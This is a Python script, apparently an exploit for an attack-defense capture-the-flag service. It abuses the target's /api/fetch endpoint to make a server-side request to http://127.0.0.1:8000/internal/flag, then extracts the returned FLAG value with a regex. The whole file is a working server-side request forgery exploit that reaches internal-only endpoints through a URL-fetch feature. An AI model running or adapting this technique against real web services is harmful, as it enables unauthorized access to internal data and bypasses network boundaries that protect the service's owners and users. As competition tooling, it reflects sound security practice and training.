#!/usr/bin/env python3
import os
import re
import sys

import httpx


def _env(name: str) -> str:
    value = os.environ.get(name)
    if not value:
        raise RuntimeError(f"missing env {name}")
    return value


def main() -> int:
    try:
        host = _env("TARGET_HOST")
        port = int(_env("TARGET_PORT"))
        team_id = _env("TARGET_TEAM_ID")
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 2

    base = f"http://{host}:{port}"
    # The service listens on 8000 inside its container; even if the externally reachable port differs,
    # the SSRF target remains the container-local listener.
    internal_url = f"http://127.0.0.1:8000/internal/flag?team_id={team_id}"

    try:
        with httpx.Client(timeout=5.0, follow_redirects=True) as client:
            resp = client.get(f"{base}/api/fetch", params={"url": internal_url})
            resp.raise_for_status()
    except Exception as exc:
        print(f"[!] request failed: {exc}", file=sys.stderr)
        return 1

    text = resp.text.strip()
    match = re.search(r"FLAG\{[^}]+\}", text)
    if not match:
        print(text)
        return 3

    print(match.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
